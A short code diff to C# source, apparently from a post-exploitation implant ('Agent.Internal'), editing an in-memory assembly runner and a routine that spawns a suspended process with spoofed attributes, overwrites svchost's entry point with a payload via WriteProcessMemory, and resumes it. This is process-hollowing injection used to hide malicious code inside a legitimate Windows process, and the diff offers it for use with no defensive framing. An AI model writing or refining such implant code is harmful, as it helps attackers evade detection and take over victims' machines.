@@ -103,6 +103,7 @@ namespace Agent.Internal
 
         public static string ExecuteAssembly(byte[] asm,string[] args = null)
         {
+            System.Console.WriteLine(string.Join(",",args));
             if (args is null)
             {
                 args = new string[] { };
@@ -142,7 +143,7 @@ namespace Agent.Internal
             }
             siEx.lpAttributeList = lpAttributeList;
             bool res = CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x08080004, IntPtr.Zero, null, ref siEx, out pi);
-
+            if (!res) { return false; }
             Native.Kernel32.PROCESS_BASIC_INFORMATION bi = new Native.Kernel32.PROCESS_BASIC_INFORMATION();
             uint tmp = 0;
             IntPtr hProcess = pi.hProcess;
@@ -162,9 +163,7 @@ namespace Agent.Internal
             uint opthdr = e_lfanew_offset + 0x28;
             uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
             IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
-
             var decryptedBytes = payloadBytes;
-            // Perform Decrypt heres
             Native.Kernel32.WriteProcessMemory(hProcess, addressOfEntryPoint, decryptedBytes, decryptedBytes.Length, out nRead);
             Native.Kernel32.ResumeThread(pi.hThread);
             return true;
